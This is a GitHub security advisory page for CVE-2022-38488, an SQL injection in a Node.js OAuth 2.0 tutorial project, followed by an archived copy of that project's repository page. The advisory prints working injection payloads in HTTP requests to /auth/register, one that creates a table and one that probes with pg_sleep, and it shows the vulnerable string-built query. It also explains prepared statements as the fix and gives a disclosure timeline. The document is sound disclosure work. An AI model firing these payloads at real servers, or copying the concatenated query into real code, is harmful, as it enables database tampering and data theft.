* [Issues](/secoats/cve/issues)
* [Pull requests](/secoats/cve/pulls)
* [Actions](/secoats/cve/actions)
* [Projects](/secoats/cve/projects)
* [Security](/secoats/cve/security)
* [Insights](/secoats/cve/pulse)

## Files

 master
## Breadcrumbs

1. [cve](/secoats/cve/tree/master)
/
# CVE-2022-38488\_sqli\_logrocket-oauth2-example

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/secoats/cve/commits/master/CVE-2022-38488_sqli_logrocket-oauth2-example) master
## Breadcrumbs

1. [cve](/secoats/cve/tree/master)
/
# CVE-2022-38488\_sqli\_logrocket-oauth2-example

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/secoats/cve/tree/master) | | |
| [README.md](/secoats/cve/blob/master/CVE-2022-38488_sqli_logrocket-oauth2-example/README.md "README.md") | | [README.md](/secoats/cve/blob/master/CVE-2022-38488_sqli_logrocket-oauth2-example/README.md "README.md") |  |  |
| [logrocket-oauth2-example-master.zip](/secoats/cve/blob/master/CVE-2022-38488_sqli_logrocket-oauth2-example/logrocket-oauth2-example-master.zip "logrocket-oauth2-example-master.zip") | | [logrocket-oauth2-example-master.zip](/secoats/cve/blob/master/CVE-2022-38488_sqli_logrocket-oauth2-example/logrocket-oauth2-example-master.zip "logrocket-oauth2-example-master.zip") |  |  |
| [poc\_createtable.py](/secoats/cve/blob/master/CVE-2022-38488_sqli_logrocket-oauth2-example/poc_createtable.py "poc_createtable.py") | | [poc\_createtable.py](/secoats/cve/blob/master/CVE-2022-38488_sqli_logrocket-oauth2-example/poc_createtable.py "poc_createtable.py") |  |  |
| View all files | | |

## [README.md](#readme)

# CVE-2022-38488 - SQL Injection in logrocket-oauth2-example

`logrocket-oauth2-example` is vulnerable to an SQL Injection due to the insertion of unsanitized user input into SQL queries.

The affected code has been published on github. The code is part of a tutorial titled "How to implement OAuth 2.0 in Node.js".

The tutorial is in the top three Google results when searching for "nodejs oauth2 example" ( Archived August 2022 - <https://archive.ph/us4A3> ). Derived projects are likely to share this vulnerability.

Links:

* <https://blog.logrocket.com/implement-oauth-2-0-node-js/>
* <https://archive.ph/VlGDa>
* <https://github.com/diogosouza/logrocket-oauth2-example>
* <https://archive.ph/PecmD>

## Proof of Concept

SQL Injection in `/auth/register`

Example HTTP Request (Burp):

```
POST /auth/register HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 50

password=test3&username=test';CREATE TABLE hacked()--

```

This will create a table named "hacked".

Data can also be exfiltrated via time-based blind SQL Injections:

```
POST /auth/register HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 50

password=test3&username=test';SELECT PG_SLEEP(5)--

```

### Proof-of-Concept Script

A Python3 Proof-of-Concept script is provided in the attached archive file. Only run these exploits in local testing environments.

1. Change the `target_ip` variable to the IPv4 address / domain of the target server.
2. Change the `target_port` variable to the TCP port of the target server.

The following command will create a new table named "hacked" in the Postgres database connected to the target server via SQL injection.

3. Run the script with `python3 poc_createtable.py`.

## Vulnerability Explanation

This vulnerability is caused by the direct insertion of unsantized user input into SQL query strings:

```
// vulnerable example code
// ...
const username = req.body.username; // user input
const query = `SELECT * FROM users WHERE username = '${username}'`;
pool.query(query, (error, results) => { /* ... */ });
```

For example a user input of `test';CREATE TABLE hacked()--` will result in the `query` variable being set to:

```
SELECT * FROM users WHERE username = 'test';CREATE TABLE hacked()--'
```

## Remedies

It is recommended to use "prepared statements" instead.

The node-postgres (`pg`) library (used in the project) provides the following example code:

```
//+ Source: https://node-postgres.com/features/queries

//+ Query in prepared statement format
const query = {
  text: 'INSERT INTO users(name, email) VALUES($1, $2)',
  values: ['brianc', 'brian.m.carlson@gmail.com'],
}

// callback
client.query(query, (err, res) => {
  if (err) {
    console.log(err.stack)
  } else {
    console.log(res.rows[0])
  }
})

// promise
client
  .query(query)
  .then(res => console.log(res.rows[0]))
  .catch(e => console.error(e.stack))
```

This will automatically escape provided string parameters.

## Publication Timeline

* Aug 20, 2022 - **CVE-2022-38488** was assigned by the MITRE Corporation
* Aug 22, 2022 - Developer was informed about the vulnerability via Email. A 60 days Responsible Disclosure deadline was set.
* Oct 21, 2022 - Responsible Disclosure deadline expired
* Nov 27, 2022 - Vulnerablity was made public

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from archive.ph_97c2ce2a_20250115_093813.html ===


| [archive.todaywebpage capture](https://archive.today/) | Saved from | | no other snapshots from this url |  | | --- | --- | | 17 Aug 2022 17:22:45 UTC |
| --- | --- | --- | --- | --- | --- |
| All snapshots | **from host** [github.com](https://archive.ph/github.com) | |
| [Webpage](https://archive.ph/PecmD)[Screenshot](https://archive.ph/PecmD/image) | |
| [share](https://archive.ph/PecmD/share)[download .zip](https://archive.ph/download/PecmD.zip)[report bug or abuse](https://archive.ph/PecmD/abuse)[Buy me a coffee](http://buymeacoffee.com/ghostpolitics) | |

[![](data:image/svg+xml;base64...)](https://archive.ph/PecmD)RedditVKontakteTwitterPinboardLivejournalshort linklong linkmarkdownhtml code<a href="http://archive.today/PecmD">
<img style="width:300px;height:200px;background-color:white" src="https://archive.ph/PecmD/e7c0033222b9940e5b935e6d9235ab82a101a9e5/scr.png"><br>
diogosouza/logrocket-oauth2-example: Implementing OAuth 2.0 in Node.js<br>
archived 17 Aug 2022 17:22:45 UTC
</a>wiki code{{cite web
| title = diogosouza/logrocket-oauth2-example: Implementing OAuth 2.0 in Node.js
| url = https://github.com/diogosouza/logrocket-oauth2-example
| date = 2022-08-17
| archiveurl = http://archive.today/PecmD
| archivedate = 2022-08-17 }}
[Skip to content](#start-of-content)

* ![](data:image/gif;base64...)

  In this repository

  All GitHub

  ↵

  Jump to
  ↵

* No suggested jump to results

* ![](data:image/gif;base64...)

  In this repository

  All GitHub

  ↵

  Jump to
  ↵
* ![](data:image/gif;base64...)

  In this user

  All GitHub

  ↵

  Jump to
  ↵
* ![](data:image/gif;base64...)

  In this repository

  All GitHub

  ↵

  Jump to
  ↵

[Dashboard](https://archive.ph/o/PecmD/https%3A//github.com/dashboard)
[Pull requests](https://archive.ph/o/PecmD/https%3A//github.com/pulls)
[Issues](https://archive.ph/o/PecmD/https%3A//github.com/issues)
[Codespaces](https://archive.ph/o/PecmD/https%3A//github.com/codespaces)
[Marketplace](https://archive.ph/o/PecmD/https%3A//github.com/marketplace)

[Explore](https://archive.ph/o/PecmD/https%3A//github.com/explore)
[Sponsors](https://archive.ph/o/PecmD/https%3A//github.com/sponsors/accounts)
[Settings](https://archive.ph/o/PecmD/https%3A//github.com/settings/profile)
[![@volth](/PecmD/efbdd3c4a030bf29026466c598dcd702b284336e.png)
volth](https://archive.ph/o/PecmD/https%3A//github.com/volth)

Sign out

[New repository](https://archive.ph/o/PecmD/https%3A//github.com/new)
[Import repository](https://archive.ph/o/PecmD/https%3A//github.com/new/import)
[New gist](https://archive.ph/o/PecmD/https%3A//gist.github.com/)

![@volth](/PecmD/efbdd3c4a030bf29026466c598dcd702b284336e.png)

Sorry, something went wrong.

/  ...  /
diogosouza  /
logrocket-oauth2-...  /

Clear Command Palette

Tip:
Type `#` to search pull requests

Type `?` for help and tips

Tip:
Type `#` to search issues

Type `?` for help and tips

Tip:
Type `#` to search discussions

Type `?` for help and tips

Tip:
Type `!` to search projects

Type `?` for help and tips

Tip:
Type `@` to search teams

Type `?` for help and tips

Tip:
Type `@` to search people and organizations

Type `?` for help and tips

Tip:
Type `>` to activate command mode

Type `?` for help and tips

Tip:
Go to your accessibility settings to change your keyboard shortcuts

Type `?` for help and tips

Tip:
Type author:@me to search your content

Type `?` for help and tips

Tip:
Type is:pr to filter to pull requests

Type `?` for help and tips

Tip:
Type is:issue to filter to issues

Type `?` for help and tips

Tip:
Type is:project to filter to projects

Type `?` for help and tips

Tip:
Type is:open to filter to open content

Type `?` for help and tips

No results matched your search

Top result

Commands

Type > to filter

Global Commands

Type > to filter

This Page

Files

Pages

Access Policies

Organizations

Repositories

Issues, pull requests, and discussions

Type # to filter

Teams

Users

Projects

Modes

Use filters in issues, pull requests, discussions, and projects

Search for **issues** and **pull requests**
`#`

Search for **issues, pull requests, discussions,** and **projects**
`#`

Search for **organizations, repositories,** and **users**
`@`

Search for **projects**
`!`

Search for **files**
`/`

Activate **command mode**
`>`

Search your issues, pull requests, and discussions
`# author:@me`

Search your issues, pull requests, and discussions
`# author:@me`

Filter to pull requests
`# is:pr`

Filter to issues
`# is:issue`

Filter to discussions
`# is:discussion`

Filter to projects
`# is:project`

Filter to open issues, pull requests, and discussions
`# is:open`

[diogosouza](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza)

/
**[logrocket-oauth2-example](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example)**
Public

* Unwatch

  Stop ignoring

  Watch

  1

  ### Notifications

  Participating and @mentions

  Only receive notifications from this repository when participating or @mentioned.

  All Activity

  Notified of all notifications on this repository.

  Ignore

  Never be notified.

  Custom

  Select events you want to be notified of in addition to participating and @mentions.

  Get push notifications on [iOS](https://archive.ph/o/PecmD/https%3A//apps.apple.com/app/apple-store/id1477376905?ct=watch-dropdown&mt=8&pt=524675) or [Android](https://archive.ph/o/PecmD/https%3A//play.google.com/store/apps/details?id=com.github.android&referrer=utm_campaign%3Dwatch-dropdown%26utm_medium%3Dweb%26utm_source%3Dgithub).

  # Custom

  # Custom

  Select events you want to be notified of in addition to participating and @mentions.

  Issues

  Pull requests

  Releases

  Discussions

  Security alerts

   Apply

   Cancel
* [Fork
  12](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/fork)
* Starred
   27

  Star
   27

Implementing OAuth 2.0 in Node.js

[27
stars](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/stargazers) [12
forks](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/network/members)

Starred

Star

Unwatch

Stop ignoring

Watch

### Notifications

Participating and @mentions

Only receive notifications from this repository when participating or @mentioned.

All Activity

Notified of all notifications on this repository.

Ignore

Never be notified.

Custom

Select events you want to be notified of in addition to participating and @mentions.

Get push notifications on [iOS](https://archive.ph/o/PecmD/https%3A//apps.apple.com/app/apple-store/id1477376905?ct=watch-dropdown&mt=8&pt=524675) or [Android](https://archive.ph/o/PecmD/https%3A//play.google.com/store/apps/details?id=com.github.android&referrer=utm_campaign%3Dwatch-dropdown%26utm_medium%3Dweb%26utm_source%3Dgithub).

# Custom

# Custom

Select events you want to be notified of in addition to participating and @mentions.

Issues

Pull requests

Releases

Discussions

Security alerts

 Apply

 Cancel

* [CodeCode](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example)
* [IssuesIssues
  0](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/issues)
* [Pull requestsPull requests
  0](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/pulls)
* [ActionsActions](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/actions)
* [ProjectsProjects
  0](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/projects?type=new)
* [SecuritySecurity](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/security)
* [InsightsInsights](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/pulse)

More

* [Code](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example)
* [Issues](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/issues)
* [Pull requests](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/pulls)
* [Actions](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/actions)
* [Projects](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/projects?type=new)
* [Security](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/security)
* [Insights](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/pulse)

[Open in github.dev](https://archive.ph/o/PecmD/https%3A//github.dev/)
[Open in a new github.dev tab](https://archive.ph/o/PecmD/https%3A//github.dev/)
# diogosouza/logrocket-oauth2-example

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

master

Switch branches/tags

Branches
Tags

[View all branches](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/branches)

[View all tags](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/tags)

[**1**
branch](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/branches)
[**0**
tags](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/tags)

[Go to file](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/find/master)

Add file

* [Go to file](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/find/master)
* Create new file
* [Upload files](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/upload/master)

 Code

* Clone

  HTTPS

  SSH

  GitHub CLI

  Use Git or checkout with SVN using the web URL.

  You don't have any public SSH keys in your GitHub account.
  You can [add a new public key](https://archive.ph/o/PecmD/https%3A//github.com/settings/ssh/new), or try cloning this repository via HTTPS.

  Use a password-protected SSH key.

  Work fast with our official CLI.
  [Learn more](https://archive.ph/o/PecmD/https%3A//cli.github.com/).
* [Open with GitHub Desktop](https://archive.ph/o/PecmD/https%3A//desktop.github.com/)
* [Download ZIP](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/archive/refs/heads/master.zip)

#### Launching GitHub Desktop

If nothing happens, [download GitHub Desktop](https://archive.ph/o/PecmD/https%3A//desktop.github.com/) and try again.

#### Launching GitHub Desktop

If nothing happens, [download GitHub Desktop](https://archive.ph/o/PecmD/https%3A//desktop.github.com/) and try again.

#### Launching Xcode

If nothing happens, [download Xcode](https://archive.ph/o/PecmD/https%3A//developer.apple.com/xcode/) and try again.

#### Launching Visual Studio Code

Your codespace will open once ready.
There was a problem preparing your codespace, please try again.

## Latest commit

[![@diogosouza](/PecmD/25e9a3cdd205607b59c0754d1b7dfa47e6ecacbf.png)](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza)

[diogosouza](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commits?author=diogosouza "View all commits by diogosouza")
[Merge branch 'master' of](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/45c6808a5df322250781e9ad9c5a67630533944b "Merge branch 'master' of https://github.com/diogosouza/logrocket-oauth2-example

* 'master' of https://github.com/diogosouza/logrocket-oauth2-example:
  Create README.md") [https://github.com/diogosouza/logrocket-oaut…](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example)

…

[45c6808](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/45c6808a5df322250781e9ad9c5a67630533944b)
[on May 27, 2020](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/45c6808a5df322250781e9ad9c5a67630533944b)

[Merge branch 'master' of](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/45c6808a5df322250781e9ad9c5a67630533944b) [https://github.com/diogosouza/logrocket-oaut…](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example)
```
[…h2-example](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example)

* 'master' of [https://github.com/diogosouza/logrocket-oauth2-example](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example):
  Create README.md
```
`45c6808`

## Git stats

* [**4**
  commits](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commits/master)

## Files

[Permalink](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/tree/45c6808a5df322250781e9ad9c5a67630533944b)
Type
Name
Latest commit message
Commit time

[auth](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/tree/master/auth "auth")

[first commit](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/86785616cd416354f856bd722aca0e70e750e27f "first commit")

2 years ago

[db](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/tree/master/db "db")

[first commit](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/86785616cd416354f856bd722aca0e70e750e27f "first commit")

2 years ago

[test](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/tree/master/test "test")

[first commit](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/86785616cd416354f856bd722aca0e70e750e27f "first commit")

2 years ago

[.gitignore](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/blob/master/.gitignore ".gitignore")

[first commit](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/86785616cd416354f856bd722aca0e70e750e27f "first commit")

2 years ago

[README.md](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/blob/master/README.md "README.md")

[Create README.md](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/ae4ce56095c9c82e9dc7f03ba3d4de963792e973 "Create README.md")

2 years ago

[index.js](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/blob/master/index.js "index.js")

[first commit](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/86785616cd416354f856bd722aca0e70e750e27f "first commit")

2 years ago

[package-lock.json](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/blob/master/package-lock.json "package-lock.json")

[updating versions](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/dbebf6b6058a8a7ba6d0ed7c7d5ace19f67b808d "updating versions")

2 years ago

[package.json](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/blob/master/package.json "package.json")

[updating versions](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/commit/dbebf6b6058a8a7ba6d0ed7c7d5ace19f67b808d "updating versions")

2 years ago

 View code

## [README.md](#readme)

# Implementing OAuth 2.0 in Node.js

This is the source code for my article on [Implementing OAuth 2.0 in Node.js](https://archive.ph/o/PecmD/https%3A//blog.logrocket.com/implementing-oauth-2-0-in-node-js/).
Before running the app, you have to set up the Postgres database. For this, install Postgres and create a new database called `logrocket_oauth2`.
Then, run this script to create the tables:
```
CREATE TABLE public.users
(
    id serial,
    username text,
    user_password text,
    PRIMARY KEY (id)
)
WITH (
    OIDS = FALSE
);

ALTER TABLE public.users
    OWNER to postgres;

CREATE TABLE public.access_tokens
(
    id serial,
    access_token text,
    user_id integer,
    PRIMARY KEY (id)
)
WITH (
    OIDS = FALSE
);

ALTER TABLE public.access_tokens
    OWNER to postgres;
```

After that, run the command to install the npm dependencies:
```
npm install

```

And finally:
```
node index.js

```

The app will start at [http://localhost:3000](https://archive.ph/o/PecmD/localhost%3A3000/).

## About

Implementing OAuth 2.0 in Node.js
### Topics

[nodejs](https://archive.ph/o/PecmD/https%3A//github.com/topics/nodejs "Topic: nodejs")
[javascript](https://archive.ph/o/PecmD/https%3A//github.com/topics/javascript "Topic: javascript")
[oauth2](https://archive.ph/o/PecmD/https%3A//github.com/topics/oauth2 "Topic: oauth2")
[oauth2-server](https://archive.ph/o/PecmD/https%3A//github.com/topics/oauth2-server "Topic: oauth2-server")
[oauth2-client](https://archive.ph/o/PecmD/https%3A//github.com/topics/oauth2-client "Topic: oauth2-client")
[logrocket](https://archive.ph/o/PecmD/https%3A//github.com/topics/logrocket "Topic: logrocket")

### Resources

[Readme](#readme)
### Stars

[**27**
stars](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/stargazers)
### Watchers

[**1**
watching](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/watchers)
### Forks

[**12**
forks](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/network/members)

## [Releases](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/releases)

No releases published

## [Packages 0](https://archive.ph/o/PecmD/https%3A//github.com/users/diogosouza/packages?repo_name=logrocket-oauth2-example)

No packages published

## Languages

* [JavaScript
  100.0%](https://archive.ph/o/PecmD/https%3A//github.com/diogosouza/logrocket-oauth2-example/search?l=javascript)

## Footer

© 2022 GitHub, Inc.

### Footer navigation

* [Terms](https://archive.ph/o/PecmD/https%3A//docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://archive.ph/o/PecmD/https%3A//docs.github.com/en/github/site-policy/github-privacy-statement)
* [Security](https://archive.ph/o/PecmD/https%3A//github.com/security)
* [Status](https://archive.ph/o/PecmD/https%3A//www.githubstatus.com/)
* [Docs](https://archive.ph/o/PecmD/https%3A//docs.github.com/)
* [Contact GitHub](https://archive.ph/o/PecmD/https%3A//support.github.com/?tags=dotcom-footer)
* [Pricing](https://archive.ph/o/PecmD/https%3A//github.com/pricing)
* [API](https://archive.ph/o/PecmD/https%3A//docs.github.com/)
* [Training](https://archive.ph/o/PecmD/https%3A//services.github.com/)
* [Blog](https://archive.ph/o/PecmD/https%3A//github.blog/)
* [About](https://archive.ph/o/PecmD/https%3A//github.com/about)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.

You have unread notifications

| [0%](#0%) |
| --- |
|  |
| [10%](#10%) |
|  |
| [20%](#20%) |
|  |
| [30%](#30%) |
|  |
| [40%](#40%) |
|  |
| [50%](#50%) |
|  |
| [60%](#60%) |
|  |
| [70%](#70%) |
|  |
| [80%](#80%) |
|  |
| [90%](#90%) |
|  |
| [100%](#100%) |

![](https://109.78.161.61.ie.PIN11.317312367.pixel.archive.ph/x.gif)
![](//top-fwz1.mail.ru/counter?id=2825109;js=na)

